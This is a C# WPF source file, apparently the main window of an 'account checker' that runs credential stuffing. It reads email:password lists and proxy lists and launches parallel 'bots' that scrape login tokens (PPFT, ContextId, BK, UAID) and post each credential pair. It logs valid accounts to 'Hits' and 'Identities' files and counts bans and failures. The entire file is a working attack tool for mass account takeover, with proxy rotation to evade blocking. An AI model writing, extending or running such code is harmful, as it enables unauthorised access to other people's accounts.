using System.Collections.Concurrent;
using System.IO;
using System.Net.Http;
using Microsoft.Win32;
using System.Windows;
using AccountCheckerWPF.Enums;
using AccountCheckerWPF.Helper;
using AccountCheckerWPF.Managers;
using AccountCheckerWPF.Models;
using AccountCheckerWPF.Services.Interface;
using Newtonsoft.Json.Linq;
using AccountManager = AccountCheckerWPF.Managers.AccountManager;

namespace AccountCheckerWPF
{
    public partial class MainWindow : Window
    {
        private readonly BlockingCollection<string> _accCh = new();
        private SemaphoreSlim _semaphore = new SemaphoreSlim(1, 1);
        private ConcurrentBag<Proxy> _proxies = new ConcurrentBag<Proxy>();
        private int _globalindex = 0;
        private int _retry = 0;
        private int _fail = 0;
        private int _success = 0;
        private int _ban = 0;
        private int _identity = 0;
        private int _unknown = 0;

        private readonly ProxyManager _proxyManager;
        private readonly AccountManager _accountManager;

        private StreamWriter _hitFileWriter;
        private StreamWriter _keyCheckStatusFileWriter;
        private StreamWriter _identityFileWriter;

        private readonly IHttpServices _httpServices;

        public MainWindow(ProxyManager proxyManager, AccountManager accountManager, IHttpServices httpServices)
        {
            _proxyManager = proxyManager;
            _accountManager = accountManager;
            _httpServices = httpServices;
            InitializeComponent();
            LoadProxyTypes();
        }

        private void LoadProxyTypes()
        {
            ProxyTypeComboBox.ItemsSource = Enum.GetValues(typeof(ProxyTypeEnums));
        }

        private void SelectAccountFileBtn_Click(object sender, RoutedEventArgs e)
        {
            var openFileDialog = new OpenFileDialog();
            if (openFileDialog.ShowDialog() == true)
            {
                var accountFileName = openFileDialog.FileName;
                SelectAccountFileTxt.Text = accountFileName;
            }
        }

        private void SelectProxyFileBtn_Click(object sender, RoutedEventArgs e)
        {
            var openFileDialog = new OpenFileDialog();
            if (openFileDialog.ShowDialog() == true)
            {
                var proxyFileName = openFileDialog.FileName;
                SelectProxyFileTxt.Text = proxyFileName;
            }
        }

        private void NumberOfBots_PreviewTextInput(object sender, System.Windows.Input.TextCompositionEventArgs e)
        {
            if (!int.TryParse(e.Text, out _))
            {
                e.Handled = true;
            }
        }

        private async void CheckAccountBtn_Click(object sender, RoutedEventArgs e)
        {
            #region Check input

            if (string.IsNullOrWhiteSpace(SelectProxyFileTxt.Text))
            {
                MessageBox.Show("Please select a proxy file first.");
                return;
            }

            if (string.IsNullOrWhiteSpace(SelectAccountFileTxt.Text))
            {
                MessageBox.Show("Please select an account file first.");
                return;
            }

            if (ProxyTypeComboBox.SelectedItem == null)
            {
                MessageBox.Show("No Proxy Type selected.");
                return;
            }

            MessageBox.Show("Account checking is starting. Please wait...");

            var selectedProxyType = (ProxyTypeEnums)ProxyTypeComboBox.SelectedItem;
            try
            {
                _proxyManager.LoadProxiesFromFile(SelectProxyFileTxt.Text, selectedProxyType);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Please ensure proxy file exists!");
                return;
            }

            try
            {
                _accountManager.LoadFromFile(SelectAccountFileTxt.Text);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Please ensure account file exists!");
                return;
            }

            #endregion

            _httpServices.InitHttpClient();

            var resultDirectory = "./Results";
            if (!Directory.Exists(resultDirectory))
            {
                Directory.CreateDirectory(resultDirectory);
            }

            var hitsDirectory = ".Results/Hits";
            if (!Directory.Exists(hitsDirectory))
            {
                Directory.CreateDirectory(hitsDirectory);
            }

            var hitFilePath = Path.Combine(hitsDirectory, DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss") + ".txt");
            _hitFileWriter = new StreamWriter(hitFilePath, false);

            var keyCheckStatusDirectory = ".Results/KeyCheckStatus";
            if (!Directory.Exists(keyCheckStatusDirectory))
            {
                Directory.CreateDirectory(keyCheckStatusDirectory);
            }

            var keyCheckStatusFilePath = Path.Combine(keyCheckStatusDirectory,
                DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss") + ".txt");
            _keyCheckStatusFileWriter = new StreamWriter(keyCheckStatusFilePath, false);

            var identityDirectory = ".Results/Identities";
            if (!Directory.Exists(identityDirectory))
            {
                Directory.CreateDirectory(identityDirectory);
            }

            var identityFilePath =
                Path.Combine(identityDirectory, DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss") + ".txt");
            _identityFileWriter = new StreamWriter(identityFilePath, false);

            var botCount = int.Parse(NumberOfBots.Text);
            _semaphore = new SemaphoreSlim(botCount, botCount);

            var tasks = new List<Task>();
            for (var i = 0; i < botCount; i++)
            {
                tasks.Add(Task.Run(WorkerFunc));
            }

            foreach (var account in _accountManager.Accounts)
            {
                _accCh.Add(account);
            }

            _accCh.CompleteAdding();

            await Task.WhenAll(tasks);

            MessageBox.Show("Done checking!");
            await CommonHelper.CloseStreamWritersAsync(_hitFileWriter, _keyCheckStatusFileWriter, _identityFileWriter);
        }

        private async Task WorkerFunc()
        {
            try
            {
                await _semaphore.WaitAsync();
                await Task.Run(async () =>
                {
                    while (_accCh.TryTake(out var account))
                    {
                        if (string.IsNullOrEmpty(account) || !account.Contains(":"))
                        {
                            continue;
                        }

                        await ProcessAccountAsync(account);
                    }
                });
            }
            finally
            {
                _semaphore.Release();
            }
        }

        private async Task ProcessAccountAsync(string account)
        {
            var (email, password) = CommonHelper.ParseAccountStr(account);

            while (true)
            {
                try
                {
                    var responseGetParamsFromLoginPage = await _httpServices.SendGetParamsFromLoginPageRequestAsync();
                    var paramsFromLoginPage =
                        CommonHelper.GetParamsFromLoginPage(await responseGetParamsFromLoginPage.Content
                            .ReadAsStringAsync());

                    var responsePostLogin = await _httpServices.SendPostLoginRequestAsync(email, password,
                        paramsFromLoginPage.PPFT,
                        paramsFromLoginPage.ContextId, paramsFromLoginPage.BK, paramsFromLoginPage.UAID);

                    var responseBodyPostLogin = await responsePostLogin.Content.ReadAsStringAsync();

                    var retryStatus =
                        await HandlePostLoginResponse(responsePostLogin, responseBodyPostLogin, email, password);
                    if (retryStatus != RetryStatus.Retry)
                        break;
                }
                catch
                {
                    _retry++;
                }
            }
        }

        private async Task<RetryStatus> HandlePostLoginResponse(HttpResponseMessage postResponse, string bodyPost,
            string email, string password)
        {
            var cookies = CommonHelper.GetCookies(postResponse);
            var responseStatus = CommonHelper.KeyCheckPostLoginResponse(bodyPost, cookies, postResponse);

            switch (responseStatus)
            {
                case LoginKeyCheckStatus.Fail:
                    _fail++;
                    await _keyCheckStatusFileWriter.WriteLineAsync($"{email}:{password} - Fail");
                    return RetryStatus.Done;

                case LoginKeyCheckStatus.Ban:
                    _ban++;
                    await _keyCheckStatusFileWriter.WriteLineAsync($"{email}:{password} - Ban");
                    return RetryStatus.Done;

                case LoginKeyCheckStatus.Retry:
                    _retry++;
                    return RetryStatus.Retry;

                case LoginKeyCheckStatus.Success:
                    _success++;
                    await _hitFileWriter.WriteLineAsync($"{email}:{password} - Success");
                    await _httpServices.HandleLoginSuccessResponse(postResponse, cookies);
                    return RetryStatus.Done;

                case LoginKeyCheckStatus.Identity:
                    _identity++;
                    await _hitFileWriter.WriteLineAsync($"{email}:{password} - Identity");
                    await _identityFileWriter.WriteLineAsync($"{email}:{password}");
                    return RetryStatus.Done;

                default:
                    return RetryStatus.Done;
            }
        }
    }
}